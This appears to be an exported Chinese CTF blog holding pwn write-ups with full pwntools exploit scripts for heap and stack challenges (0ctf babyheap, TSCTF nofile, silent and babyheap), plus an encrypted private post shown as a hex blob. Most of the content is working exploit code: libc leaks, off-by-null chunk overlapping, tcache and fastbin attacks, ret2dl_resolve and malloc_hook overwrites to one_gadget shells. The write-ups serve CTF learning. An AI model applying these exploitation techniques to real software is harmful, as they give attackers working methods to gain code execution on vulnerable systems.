main_arena又在libc的data的段里。 当malloc()时，当fastbin里没有大小正好合适的chunk的时候，会从unsortedbin中找到大小大于需求的块切割了分给用户，剩下的继续留在unsortedbin中。 当free(smallchunk)时一定要注意不要被topchunk合并，并且不要触发unlink。 calloc()申请的空间会全设为’\x00’ 2018_0ctf_babyheap: 这一题算做出来百分之80，因为有2017年babyheap的经验大致思路有个轮廓。 不知道为啥exp得多尝试几次才能成功，有时候会报错。？？？ 对堆的利用有了更深的理解： leak的方式： 程序自带的打印功能，这又分为几种情况： 打印字符串（常见的有name，host等等），注意这些字符串输入的时候有没有最后 ‘\x00’ 的缺失，如果有的话就会泄露之后的数据；还要注意其是不是用strcpy()输入的，如果是的话，可能又会有漏洞。 打印功能的函数，目前碰到的有两种情况： 打印存在堆上的content的内容，而堆指针不知道在什么位置，这种一般是利用其泄露&amp;main_arena+88的地址。 打印存在堆上的content的内容，而堆指针知道在什么位置（bss段）或者也在堆上，然后通过unlink或者其他的方法（程序的edit功能漏洞）将堆指针改为函数的got表（一定要是调用后的函数），然后泄露函数实际地址进而泄露libc。 自己构造泄露，需要先通过操作实现change的功能，然后通过(比如）free(chunk_ptr)，先改free_got的值为put_plt，然后将chunk_ptr的值设为某个函数的got表，就泄露了那个函数的实际地址。 edit的方式： 程序自带的edit功能，可能存在off-by-one类漏洞（一般之后为chunk overlapping），或者直接不限制大小直接输入。 程序在申请chunk的时候就会输入内容。 2019_babyheap:分析功能和寻找漏洞：首先这道题libc是2.28，所以带有tcache，我们不要忘记了。 emmm。。。首先我们在准备函数里可以看到程序随机出一段地址，并用mmap申请了0x1000大小的内存，不过最值得我们关注的是其申请了一块0x1f000大小的堆内存，这让topchunk的大小落入我们有望消耗殆尽的范围以内，然后接着分析可以看到程序四个基本功能都有，new，delete，upgrade，view都齐全。 在new里我们看到最大的size限制到了0x58（和18年一样），然后个数限制在16内以内，除此之外，还有一个需要注意的问题是new用的是calloc()函数，这个函数直接调用了_int_malloc()，其和malloc()不同，其没有_get_tcache()的调用，所以我们new出的chunk只会从bins里取，不会从tcache里取。 在upgrade里我们可以发现一个off-one-null漏洞。 在view里就是打印。 在delete里就是free并清零。 分析漏洞及利用：综上所述这道题有off-one-null这个洞并且有view功能的话，leak出libc很明显就是用chunkoverlapping，但是现在的问题是要使用off-one-null的话必须使chunk的size是三位数（不然size直接变0了。。。），所以我们必须想办法破除size是0x58的限制，想办法获取unsortedbin中的chunk，再结合准备函数里的malloc(0x1f000)，可以想到是不断申请chunk释放chunk将topchunk消耗殆尽，然后调用malloc_consodilate使fastbin中的chunk合并获取unsortedbin_chunk，之后就是常规套路的泄露和带有tcache的house of spirit。 exp如下：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151#coding:utf-8from pwn import *context(os='linux',arch='amd64')#context.log_level = 'debug'p = process('./babyheap')P = ELF('./babyheap')libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')def new(size): p.recvuntil('Command: ') p.sendline('1') p.recvuntil('Size: ') p.sendline(str(size))def upgrade(index,size,content): p.recvuntil('Command: ') p.sendline('2') p.recvuntil('Index: ') p.sendline(str(index)) p.recvuntil('Size: ') p.sendline(str(size)) p.recvuntil('Content: ') p.send(content)def view(index): p.recvuntil('Command: ') p.sendline('4') p.recvuntil('Index: ') p.sendline(str(index))def delete(index): p.recvuntil('Command: ') p.sendline('3') p.recvuntil('Index: ') p.sendline(str(index))#---------消耗topchunk,在消耗的同时使用off-one-null加快其消耗----------- size = 0x58for i in range(7): new(0x58) upgrade(i,0x58,'\x44'*0x58)for i in range(7): delete(i)#--------------------------------------------------------------------- size = 0x48for i in range(7): new(0x48) upgrade(i,0x48,'\x44'*0x48)for i in range(7): delete(i)#--------------------------------------------------------------------- size = 0x38for i in range(7): new(0x38) upgrade(i,0x38,'\x44'*0x38)for i in range(7): delete(i)#------------------------------------- for i in range(8): new(0x58) for i in range(1,7): delete(i)#---------------------------------------------------------------- 开始精准控制top大小for i in range(5): new(0x28) upgrade(i+1,0x28,'\x44'*0x28)for i in range(5): delete(i+1)for i in range(5): new(0x18)for i in range(5): delete(i+1)new(0x28) #malloc_consodilate 1delete(1)#-----------------------------------new(0x28) #1upgrade(1,0x28,'\x44'*0x28)new(0x58) #2new(0x58) #3new(0x58) #4new(0x48) #5new(0x48) #6new(0x38) #8delete(7)delete(2)new(0x28) #malloc_consodilate 2new(0x20) #7view(3)p.recvuntil('Chunk[3]: ')libcbase = u64(p.recv(6).ljust(8,'\x00')) - (0x7f2a7d54dca0-0x7f2a7d369000)log.success('libcbase = '+hex(libcbase))#--------------leak down and start house of spirit-------------new(0x58) #9delete(9)upgrade(3,1,'\x5f')new(0x58) #9new(0x48) #10delete(10)fake_addr = libcbase+(0x7f47cdf6fc60+8-0x7f47cdd8b000)upgrade(4,8,p64(fake_addr)) new(0x48) #10new(0x48) #11 payload = p64(0)*5 + p64(libcbase+(0x7f23fdf77c18-0x00007f23fdd93000))[0:7]upgrade(11,len(payload),payload)upgrade(3,1,'\x00')for i in range(5): delete(i)new(0x48) #0new(0x48) #1new(0x48) #2new(0x48) #3new(0x48) #4new(0x48) #12one_gadget = [0x50186,0x501e3,0x103f50]'''0x50186 execve("/bin/sh", rsp+0x40, environ)constraints: rcx == NULL0x501e3 execve("/bin/sh", rsp+0x40, environ)constraints: [rsp+0x40] == NULL0x103f50 execve("/bin/sh", rsp+0x70, environ)constraints: [rsp+0x70] == NULL'''upgrade(12,16,p64(libcbase+one_gadget[2])+p64(libcbase+libc.sym['__libc_realloc']+4))new(0x10)#gdb.attach(p)p.interactive()]]></content>
      <categories>
        <category>CTF-PWN</category>
      </categories>
      <tags>
        <tag>WP</tag>
        <tag>summary</tag>
        <tag>0CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[to_do_list_of_next_stage]]></title>
    <url>%2F2019%2F06%2F09%2Fto-do-list-of-next-stage%2F</url>
    <content type="text"><![CDATA[私人空间，谢绝访问 5f0fc61e0fbe17023dbe555d6ce3b75ef4eb905f0e7b8a214f8712a5b8b87cbfd9fd4bbf15bba0f8201d02786944bb353ced2787bfaf23f69f8aa6d68854d1422b26933ede04d0fb813549dd5e7b48c7a741684d58d630922f9762a6ab8b06c4d5510fb3845418fe5c52a29ed17e126fbee0a697fd72f2c57b717240dea878ffe26f750aca8ec6f2943054e99df88051270aefcf837f0d100f92c52088c0a60a80222eec07953e631fddb9b59a2aba444b13115df0e4b82ae38c8239ddccda240f74b6d3d02be576384ad952459ce7b3a8e5d95650c31bbd3a5ab2e82526a01b4d72ee9b80efa80e4ca3d02aeaabf1d1d6824e9be388e71a61ad2327857836a1b56940d0b30eaa738d5b33f43bcec6d11ae790c9227c641a24cb20041f48cd500c96b9d0d631cfae72119505dbd5d856959af00dc9bae6209b6a858f75f08d5beb56f0b01dcfdfc3df561b5e1fe932a418965fb3b35d8e55aded46ae989bbc336c7c998d1670fdb2aabecd82cb330a8ddfcde79be56262ab0c7ce9674e456b25ad1190e99f4e21ab27bf909b97e5ce80667ee8cabc0ba4eba6f49c65dbc84b3717ef547992609fe95a1d78d11f657f30bdf4ddc31e13fd1014c902e0ebc64ef263fe31f6ad42d23380c5a11986bc84289c6f10ccabb3e492878577ed04dcb5abb983c6f7ca3f46d080cbe2c318db7f21400043debc6b4c2a35e4ad090e3233546feea7957109ceea8a53735a16a5afd6f20ffa8a1e50fb624d4bbf53ad7194573d264dff3e0a000cf07019ad8fceb60401ed8ac0b66bbd8285397c7ddf05064e04152d5b18df4b68e24f00ae5c130216e8bb0c595807cd97c6cdf97b955ace4fe77939ebdf3b7a15f7e1d0c4d303e12d79296e1d756d28053ed02785ef1d70339caf97c108aa8e2f455b548aedc82fad94644c98b9febd986b9a7695ab068b979a59c9347c15aaea0ca3bec44ae154c8abbbbc0fb22fd91ea57ca38998f2761760331dc5752c69c41755b7541bd14c3da6fd05f45851460c8ea04be368f6bebb71c53a592d57f1a4b74c63f39bd877e56125c60138052df69cdef688633b631fe3eabab665a7450d543f4b2f599fb15b45db004423895190fa8a5b72683b2d3c927eb3a96a3a4bf793de6a6e4cf1cebcfa79ba46155250f69d6025abc9eac31ac59a3e2f389f333ed4788474d3ad30e8e097daca21bd6ecaa25fdde2ddb69e7d22b9440229abf1900bcbdc3f9ed92bb1f61566932ae7cb7c02e8c736670568a003758ee4f7335b169466ab3f7f04f397084357cff8388c8f71a0398315dded4271a37d4b8efd4dc0ed15fafcfb4c502557d6a59a1394f8b3f1b80e9e0c6fc1d7d8f71baee0cc78811f2d28348a2359849cefe3189ca0f4ce9df8c0b00fb1f17ef0acedc0a5dccc598950c113f51e6a57755c06125451103d8714358441a58635dd8760b5c0b0e2454beefd8ae10812089c57b04ff2bbe11aca5a0d3a5dd851ca9d10b47ad103ae95eb6efbb79f4b29bb0a5ce06504ed339800a4d7cc4ba5a2460a0e75ec55533b5bebdd5cee659ad84a01cdc3266ef89b5fd6550a1c0fe3309066515e280aa64580a35697ee46ef17a3387d11d5698336cb64500b61023baf4781b24c82d76c932c4c32bf22cc58e3896030ec0cc4d040f67fc6dc962b6876deeaf894632ae94a2d9fd05761eaceaefc5f395fb410416f5124c15bf26ac297c8807a49e122b04596f80fd0301fa9302e919c8e7403d2c967bd0948fefc30cd3f826a7f391ac87b31a3b75fa2dd5182903ced3b4493f12df45a953e1fd87832852993091157481d886b664ecbe7bb97047f19a3cbd9819adaf713b1ad905f75ff6d99156cd748569bca296e1b44b31ac45e87c5ce79000979ca0178226c68211634fd27f1abfe269b9d09c6301d88c3a0e0d1557786dd924b2355e2a31e82b0ccbbfbc6f972c194734496654eaf021e1c265a68ea6ab932caa0b7473b02a0ec98c8b7bd6c220b884ac3c3aa302008a2922406ec5e95fd22b5f91238a89ce4066af43098bd6cc18a9468b75f02d7eeb2af1a42487ce85bec5a180841b48f950126b3482207955a99fd117a912232268e872091483e0f4a57d623c8faa307dcbbbf801063a99130058fd99dcf5d0a848edac3b127769c5ae8de9ac1eb714109e5b6b62ce3ed9053f903c11d6d868c18a3d8da00133a3b9c81cf297f1f162152b36be0b2bd8206efe3ad89ab37eecbef7aaf289e595699a03423ac26729ec656d12755efeddd79cf0acafb23abe4abc9a139bc6978cbe7613f7079c4ead4c6b2be6d6d7a9adcb9b8cf4707a2c1c064542861513428c66f108fe4a3506d9045336aa4cc29094a0c81dca0fa17fc183d1ef1b9d03d30523243a1f7909bd7929b43ddabe511b226d70d7f6baa1e01813a59b5c93cf8c6054f99a5f45f9047ae37d4e764614f9766c3b18ed465c78b46e8e559435e39cfd641ea9e3411889f3bed18078c06f56696de7aea99dc9ca452c4fc392dc26a00a7f89ec30142dda5900fa63d85279f3660b79bebd9e4b07d0fa05f2df4b551bfd46632fc8ee110283d101e5dce7801ed3d1d5edb92c5ce9ce0544338bd3859c478d5a80514eff43cc3996476cdf10d4d8506f8e9bccd58993cbb3e0e90ba7230949bc187bc74ee4cead77dd8ffb5a9fefd941f5e858581b846cf3c6044ba9159394a1a6a8d4b09a3160134cb65f92afe9e66dbc0487ce72fb12db88fb2ef0c6fd4a418d5899ff590832b90e8a08951098973aa0d34944cc468005a1a30c8cf86b13f2cf3df9bc89942f8a21b46d86d7f8e822397b811bccebf34fbcd253becb74f4513469f8b55d8d93bd3a0cb316ee25e05f4151283049e93b8374a129c7562490ee62e81758f995554cba38a4ee757db670baca616efdb89ff36a1eb674593ff8ce649243fc078929a8dd155c61204f4761eb4c4459079025aefeffad8a137906395ede0ece2494f7e4189c7518aa2af3ebf1d0b08e74e13b7cda9e5c508d355258380f541705d1c2ada6eb4346f68f9e3134716f2de2a3c3c81f8c0c290794c5e7c7cde90ec8852fc70e41ab769f84ecff852935c8ccbf69b738a0a6daf04c6a1898dd6d4bafa860dc59edcfde01913708f3e72507386f2bb735ea2f0631ceba1e21d72cd9ad2a69342eede132fbd309377c9d4e02cd89a6421f62a22169bba5d9adfb9b1952a7b4f2141964db2a010d8e8d86b8027d2c7659bb7038b2d97c5f56bac66689df70369610840135f12cdccd20bfd69ce147f49b14c1b877286c0d1a71a062e0751b1b80200b972bb524efe5a96a19dba560cb8e5c9c4496b754255be605fee94f66d8688a0dc83d2e3fab6e1238f64c554be7c943790b4cb911ac02a9f06d89657069cd8bcda457024967c89db9058fab231816f4ec69b7eaf45e106443c52d29b48ca8cfce2e5c6dc0530584b5a18651768d1b483e7533d2c7b2cedea70a2b2bd7e4a6a53c0ff5b9758f147270bb3b60374c012f508dcf8674d70ec7abb6cccec074e64f0694c5c03da32a94e461315cd249922f11afd5e0534b0d8e52b0f3fc01632bdcb33cb96fae8d1983df08c7655ee0039636e2f1e571ea05a18bdcffbfdbca26db6f32d97992da7211fa9e48496f134a1c1453feaacfecabcc9767473711e4d12c3f0387b91f131037ea2060346837a21e70f30deb0c711cb073565a6e0e80ec4aad72ec2766667479d40f33db45bdb426c8d50132b92f7826031cd8e56b981cefca465e8461efb2acbc737e20ffed5facb714dd405d58c0b63b9f61b22538d1ffede42b7a06e1548639c30c780623a86fe00fae39038ee1a182f529ce3631a738a9398cffc4964ebcdc3edaba3ac8179d3b0767826780f7c819af1affc8d258ac68c3c0db1d78e70e0240c9eeefa28b8b872161f0c34e13139f51c08f8897497b73d20297eeea9e7db170063b63722b29987c5f87619836e73aebd30398c8d734989bbe89bcfe221abc881c7c76d7d8ed204707636b30dd4659d9cf2998564422008a42de74e2338a3e14d4abcecd00fe68a82f5b87730a3baee9847c02d8c0abb4c181e7aa0442cbba69ed676f5d80d83b5800fa320bee2be66123e16de290387e3e9ff3e5f347fb7047e71a6a979f332b468766403248ab4b631c8cfc0584763d82be359be15ac7d09a7fc12e568c4f9989eb06eda6ce9b87166dc8ebb49376b8d30aed6ff1f55c96096c06009f46ae878579b04b5e7f9affff83178d65dd03844ce25201b1ec13e835bfd68aeb92003021420c7a4bd7f1c633fbb7bb1f30bb8a9b2860a22e0e831d69278e8bd987360f097ee8b9b83adef10349e2d3702e66bba65fbb19a67d23fc0317aaa3f3e5ceb5897a1ce3bb21716d643a95cc1392404dabdfdff3388b9977cdd377269469c9e90000e8f7dc1d9c066495b346a9559c12de2626274a45a365812d868fa6cd3e32f4795a21b18a7c7578dc57aa39b417a5050c62605afd5ca7c777f8cc589dfba384d2eb928dd3b73df43735d6fdf3f8b818948b870679f075dae97a6f1c09a7ca8d2ac0553170b357451b07d6e6eacb0927d53241becaa5c8ef6b5cb714a9a5fec592eff890deb72a906aa8f3f96e2049891a4907f5c44501a3f32104e34eff817436cef2649df79602cb791fdef67eadd1db5af794c5fb70d4096907557b85be51387d3aa1ccd98fa0e88946db92e78d39ce76c47bcfae266c3e06ef595acd116ad2cb66b6394a185c35d113654f0b638d9c38652fffdf7d60167a1a3933a2946a1654c8244670c2efcbd8a8283426f604926aaf983f612c160cfe59b49cd8690bc0ceb15f168f71304100a0a8d3ba40eff88988451d97dcf8ff6f1922c55d19401642537be95cf8e48cf2ae417fa21f40c3441770bbd70b353ba6f702acc7730fb368be386506ecf62f5dd03076ffd3ee514ac73c9a9c382d1fede81368e1cca86d2b8ef37535558dfb7d18d97e7de4f1b5af2d30e80557c7507ddd38f5b2a300af6ee0cb2f3aa1d791cf4b78df520aca72cec26280a865e889f844e1688d3a0133ba0571ce5ed40f5351d60f54beb9341e2ad8a30b68a41119f31fe2cc0ac916db28b529af81cc37064ff2c41473d0856c0052e199f7ccfdf5a71c32c1c3fe7b54dacd5c54298e0cef7fdd37fc48bae6f62c974ddd3d2f094a011357f526f389ff431723a4f74ccca0aded72ab535b8e448467d4fccb37d12b3e8a74988bef5e8d657933f6069edf60c892c7df12b2aeb14de52f8be609edca7593a3e7b2f38661e88d319dcaca826f5e4670dcb7fb3ee0419b3fa1612a2d1b94e0c4a897bc2578f0231c2a0378604b6cd19c77421c6ec81ceffb623d708c9d1bd4152a76b24fd97f073c5d5d104564f872ee4d14bc15c38457d34e43c9c21f66c2b6968af6e537bd435d2bf07870bd20a9b71d8cb878f54abeffec3a636563d450fd6a7881d233865fba24e37a603ce3262406aefe165edb09f1ac7269e5d69b5d3701a1994ed52b4104af85353cb56aab03e8113847060a25217aed93667bcc8ad3bc1e70ae0f6925381e953fe6f0431bc788c7122b6a4071ee26a316c3caad53a81d9320cee8cc4217bc78eff0572a1b33a18ed1d6378461c3d80e918250ac7141c7691f43075f7643cfa5250c56cfdf6302f4aa9699cc873b57e6db5e90a526d0a24670ff665bd833b2816de4df6f3569a62e4ac7d12ae1b8aad4932140b9b8f4f7ae815e01b1b17488902b101369fa7fa4ac3c3be1de63820b3b230fffcf050a89c2640dfc3ae23f22a2bb89ffebc77caafd5b64e8c88bddd3b0bd8d659d2bb48b34bdc2d184d845818c56c2e36ab315cdeecf65d140b013296fc1edbd21bec644700f29875f53d8fb8ca47013ecc7c4e25521ed4bd109922efde70c7697e78707364adcb136e97c241f4bfb01790ba13bc3a376308605f97abf8322ec581682e97f24990f7de57832f90c214fa8ba1b24313a22e22428d80f963f661561417bcc4b690393cb1ef3feccb85da87a7a30efba9390ef86504e5890096b15fa94167c306e93be28b49516025bea3e454f9100e3eb4b6b13ecc5e1c8d8eae4dde2540d1203b22034005da24e59d24690d4b4cfe60c166c83d4192f81c34c464a7b23ad5cd12d69dd02282eceb6eeee2a9e6546112593bf10fe016e911974e605879831893c5958e627ac9f5b5d133a66a5a477175face761e86dacaaf36f25914ef616c13e541b738ab5559856a8782728c6e396346f99ade3efbc3c1a7fd44994ca8256aa1e6139a4478b8a337a008e03b7979b9d48b586f05a28a8335e535e187525cf380865198de38a703e699d767223887415e0d3345e2d15c73deae7356db819150fca707ce5f9a10cdbb0a71223916c28e3c524ec7fc649a54e7c966bb4c2f5226214d013d3686d25ac48ffe9d1cd75e09cf96c6e1d76b7f24a86f97e8aba11ca674915302fb49f89b7bb0825bd3a52edfed84b14750641c3dc8d6e6e2d1d483e69af80d16923d68116d58c28260aeef70118d1f8107e996ea3faf9c4b22d537e4256603eb2674796005a8402b97e5c639504c9c5f1487f316c95edb7b498b2765db3fa3af5da5215c188a02bd34cb378d788773b7fdb10f37ef6a12d6133a1d7591403b8084bddd41060f3df10924bd230aa9b56c6b049903df3c1843035f9cc09fe409d335f6ad3e2a9ab5fc1f69afa11793ac9c78868cac9b66d2c46996e76f9539ebd9d2d023d1524ff659e444a0dd95c150ed910d1267de8a35d06a5c575f831eac8253e033557c49b60d58aa529f589b57275b47494df8fbdd96b58a361b6a14dfed46d796e454f915da8d741b7e79312c927aa2c22d5a7d81251644cdba89eed4a35f46c34b50b32520880e9a8c5aebaae541c793c4e233d398c6c2a6be3f845954725a0e421cdf0a953d2f9aa1c8a9865c4cc1ed3bd65979011372756fc3d6b920d49014121204adf78a0e7bc9e0a1f832ac762c7cb97f65dada159acc3b173238c8dbb70b211882374c84c81ea7e8b43190cbf5b18f178571aedb56fd5b7a38892db747bb8927d8a26203e6450c7e6a9d994b03d537b8f9ddca863c14d09561c33e576aa67c8c70732c5ac01f7a]]></content>
      <categories>
        <category>私人空间</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[2019TSCTF]]></title>
    <url>%2F2019%2F05%2F18%2Ftsctf-2019-pwn-writeups%2F</url>
    <content type="text"><![CDATA[NOFIFE思路：因为两次输入栈上数据，可以第一次泄露出canary和程序基址，第二次利用rop调用puts函数打印出read函数的实际地址泄露出libc，并把程序的最后的ret_addr改为main，当再次从头开始运行时利用rop在bss段伪造一个rilimit结构体，将其值设置为合理值即可，然后调用setrlimit()函数解除文件打开数量为零的限制，最后用system()打开shell（one_gadgets也行应该。。。。没试 orz），读取flag。。。。（后来发现根本不需要泄露libc调用system。。。可以直接用vulfunc打开flag。。。。），这题当时做的时候一直思路错误，一直想把那个限制过掉，找了一下午资料都没有结果，这题也是我花时间最长，最让我崩溃的一题，后来发现这么多人做出来了，思路肯定不偏。。。。才回过来神。。。。在第二天中午出的。。。。过程很曲折。。。QAQ exp如下：12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091#coding:utf-8from pwn import *context(os='linux',arch='amd64')#context.log_level = 'debug'debug = 1if debug: p = remote('10.112.100.47',6135)else: p = process('./nofile')P = ELF('./nofile')libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')p.recvuntil('2,3or4?\n')p.sendline(str(24))p.recvuntil('Name?\n')payload = 'a'*0x18p.send(payload+'\x33')p.recvuntil('\x33')canary = u64(p.recv(7).ljust(8,'\x00'))canary = str(hex(canary)) + '00'canary = int(canary,16)log.success('canary = '+hex(canary))base = u64(p.recv(6).ljust(8,'\x00')) - 0xd80log.success('base = '+hex(base))p_rdi = base + 0xde3p_r15 = base + 0xde2p_rsi_r15 = base + 0xde1vul_addr = base + 0xc13bss = base + 0x202a00main = base+0xc94start = base+0x980part1 = 0xdd6 +basepart2 = 0xdc0 +base#part1为地址大的，part2为地址小的。def call_fun(fun_addr,arg3,arg2,arg1): payload = p64(part1) payload+= p64(0) payload+= p64(0) payload+= p64(1) payload+= p64(fun_addr) payload+= p64(arg1) payload+= p64(arg2) payload+= p64(arg3) payload+= p64(part2) payload+= 'a'*0x38 return payload#gdb.attach(p)sleep(0.5)p.send('n')p.recvuntil('Length?\n')p.sendline(str(0xc7))p.recvuntil('Name?\n')payload1 = 'a'*0x18 + p64(canary) + p64(bss)payload1+= p64(p_rdi)payload1+= p64(P.got['read']+base)payload1+= p64(P.plt['puts']+base)payload1+= call_fun(base+P.got['read'],0x10,bss,0) payload1+= p64(main)p.send(payload1)read_addr = u64(p.recv(6).ljust(8,'\x00'))log.success('read_addr'+hex(read_addr))libcbase = read_addr - libc.sym['read']log.success('libcbase = '+hex(libcbase))system_addr = libcbase + libc.sym['system']log.success('system_addr = '+hex(system_addr))sh_addr = libcbase + libc.search('/bin/sh\x00').next()log.success('sh_addr = '+hex(sh_addr))p.send(p64(0x10)+p64(0x10))#gdb.attach(p)p.recvuntil('2,3or4?\n')p.sendline(str(0xbf))p.recvuntil('Name?\n')payload2 = p64(0)*3+p64(canary)payload2+= p64(bss)payload2+= call_fun(base+P.got['setrlimit'],0,bss,7)payload2+= p64(p_rdi)+p64(sh_addr)+p64(system_addr)p.send(payload2)#gdb.attach(p)p.recvuntil('Right?\n')p.sendline('y')p.interactive() silent思路：看到题目是silent的时候就猜是关了stdout，还是没有leak，幸好是后者，前者我可能要凉。。。。然后看到这种啥都没有的栈题，又有*(got[1]+0x1c8)= NULL的暗示。。。。很明显是64位的ret2_dl_resolve。。。。因为32位的之前做过，还算思路清晰，本来想自己构造的。。。。结果发现之前寒假好像有留了64位的基础构造脚本，直接拿来改了改数据就出了。。。。。。 exp如下：12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394#coding:utf-8from pwn import *context(os='linux',arch='amd64')#context.log_level = 'debug'debug = 1if debug: p = remote('10.112.100.47',8001)else: p = process('./silent')P = ELF('./silent')lr = 0x40054abss = 0x602a00p_rdi = 0x0000000000400613p_rsi_r15 = 0x400611p_rdx = 0x400615p_rbp = 0x400490payload = 'a'*7p.send(payload)sleep(0.5)#gdb.attach(p)payload = 'a'*(0x70+8)payload+= p64(p_rdi)payload+= p64(0)payload+= p64(p_rsi_r15)payload+= p64(bss)payload+= p64(0)payload+= p64(p_rdx)payload+= p64(0x500)payload+= p64(P.plt['read'])payload+= p64(p_rbp)payload+= p64(bss)payload+= p64(lr)p.send(payload)sleep(0.5)plt_0 = 0x4003f0rel_plt = 0x400398dynstr = 0x400318dynsym = 0x4002b8fake_Rela_addr = bss + 0x150 #新栈上选择一块地址作为伪造的Elf64_Rela结构体基址，稍后还要通过计算进行0x18字节对齐fake_Sym_addr = bss + 0x190 #新栈上选择一块地址作为伪造的Elf64_Sym结构体基址，稍后还要通过计算进行0x18字节对齐，与上一个结构体之间留出一段长度防止重叠fake_dynstr_addr = bss + 0x1c0 #新栈上选择一块地址作为伪造的.dynstr函数名字符串system放置地址,与上一个结构体之间留出一段长度防止重叠binsh_addr = bss + 0x1c8 #"/bin/sh\x00"所在地址rel_plt_align = 0x18 - (fake_Rela_addr - rel_plt) % 0x18 #计算两个结构体的对齐填充字节数，两个结构体大小都是0x18rel_sym_align = 0x18 - (fake_Sym_addr - dynsym) % 0x18fake_Rela_addr = fake_Rela_addr + rel_plt_align #加上对齐值后为结构体真正地址fake_Sym_addr = fake_Sym_addr + rel_sym_alignfake_reloc_arg = (fake_Rela_addr - rel_plt)/0x18 #计算伪造的reloc_argfake_r_info = (((fake_Sym_addr - dynsym)/0x18) &lt;&lt; 0x20) | 0x7 #伪造r_info，偏移要计算成下标，除以Elf64_Sym的大小，最后一字节为0x7fake_st_name = fake_dynstr_addr - dynstr #计算伪造的st_name数值为伪造函数字符串system与.dynstr节开头间的偏移fake_Elf64_Rela_data = ""fake_Elf64_Rela_data += p64(P.got['read']) #r_offset = write_got，以免重定位完毕回填got表的时候出现非法内存访问错误fake_Elf64_Rela_data += p64(fake_r_info)fake_Elf64_Rela_data += p64(0)fake_Elf64_Sym_data = ""fake_Elf64_Sym_data += p32(fake_st_name)fake_Elf64_Sym_data += p32(0x12) #后面的数据直接套用write函数的Elf64_Sym结构体，具体成员变量含义自行搜索，这里要注意数据大小fake_Elf64_Sym_data += p64(0)fake_Elf64_Sym_data += p64(0)payload = p64(bss)payload += p64(p_rdi) #为system函数设置参数"/bin/sh\x00" payload += p64(binsh_addr) payload += p64(plt_0) payload += p64(fake_reloc_arg) payload = payload.ljust(0x150, "A") #paddingpayload += 'A'*rel_plt_alignpayload += fake_Elf64_Rela_datapayload = payload.ljust(0x190, "A") #paddingpayload += 'A'*rel_sym_alignpayload += fake_Elf64_Sym_datapayload = payload.ljust(0x1c0, "A") #paddingpayload += "system\x00\x00"payload += "/bin/sh\x00"p.send(payload)#gdb.attach(p)p.interactive() babyheap思路：感觉babyheap和babytcache出的水平都很高orz，babyheap刚拿到时惊了卧槽。。。。只有malloc()和delete()的题我还是第一次见到。。。而且漏洞点好像也只有off_by_null ??? 但所幸我之前进行过noleak相关的题·，找了不少利用文件结构体泄露的题，然后泄露成功之后，想往main_arena-0x33分配fake_chunk，结构发现会有0x0a字符截断。。这个设计是真的巧妙。。。。最后是改了topchunk的地址为malloc_hook-0x10，然后改了malloc_hook为one_gadget，用free()来触发malloc_printerr来获取shell。。。。三个小时不到出的，但做完还是意犹未尽hhhh，真心感觉很棒！！！感觉把几个月刷的堆题的经验都掏空了orz。 exp如下：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100#coding:utf-8from pwn import *context(os='linux',arch='amd64',timeout=0.2)#context.log_level = 'debug'debug = 0if debug: p = process('./babyheap')else: p = remote('10.112.100.47',10003)libc = ELF('./libc.so.6')P = ELF('./babyheap')def new(size,payload): p.recvuntil('&gt; ') p.sendline('1') p.recvuntil('Size: \n') p.sendline(str(size)) p.recvuntil('data: \n') p.send(payload)def delete(index): p.recvuntil('&gt; ') p.sendline('2') p.recvuntil('delete: \n') p.sendline(str(index))payload = '\x00'*0xf7new(0xf7,payload) #0new(0xf7,'\x01'*0xf7) #1 0x100new(0xf7,'\x02'*0xf7) #2 0x200new(0xf7,'\x03'*0xf7) #3new(0x20,'\x04'*0x20) #4delete(2)new(0xf8,'\x01'*0xf0+p64(0x300)) #2delete(0)delete(3)#-----------------------------------new(0x60,'\xdd\x15'+'\n') #0 bbnew(0x60,'\x03'*0x10+'\n') #3new(0x30,'\x00'*0x10+p64(0)+p64(0x101)+'\n') #5new(0x60,'\n') #6 kknew(0x100,'\n') #7new(0x100,'\x00'*0x50+p64(0)+p64(101)+'\n') #8new(0x40,'\n') #9delete(3)delete(6)delete(1)new(0xf8,p64(0)*3+p64(0x71)+'\x00'+'\n') #1new(0x60,'\n') #3new(0x60,'\n') #6new(0x68,'\x00'*0x33+p64(0xfbad1800)+p64(0x7f7d44fa36a3)*3+'\x50'+'\n') #10p.sendline()libcbase = u64(p.recv(6).ljust(8,'\x00'))-(0x00007f7d44fa36a3- 0x7f7d44bde000) log.success('libcbase = '+hex(libcbase))one_gadget = [0x45216,0x4526a,0xf02a4,0xf1147]main_arena = libcbase + (0x7fd58aac0b20-0x7fd58a6fc000)log.success('main_arena = '+hex(main_arena))p.recvuntil('invalid choice~~\n')p.recvuntil('&gt; ')p.sendline('2')p.recvuntil('delete: \n')p.sendline('1')'''io_list_all = libcbase+(0x7fb77a171520-0x7fb779dac000)log.success('io_list_all = '+hex(io_list_all))delete(5)new(0x38,p64(0)*2+'/bin/sh\x00'+p64(0x61)+p64(0)+p64(io_list_all-0x10)+'\n')delete(3)new(0x68,'\x00'*8+p64(0)+'\x00'*0x57+'\n')'''delete(0)delete(3)delete(6)new(0x60,p64(main_arena-(0x7fcaabde0b20-0x7fcaabde0b05))+'\n')new(0x60,'\n')new(0x60,'\n')new(0x60,'\x00'*0xb+p64(0)*5+p64(0x7f)+p64(main_arena+0x20)+'\n')new(0x60,'\x00'*0x28+p64(main_arena-0x20)+'\n')new(0xf0,'\n')new(0x20,p64(libcbase+one_gadget[2])+'\n')delete(11)#gdb.attach(p)p.interactive() 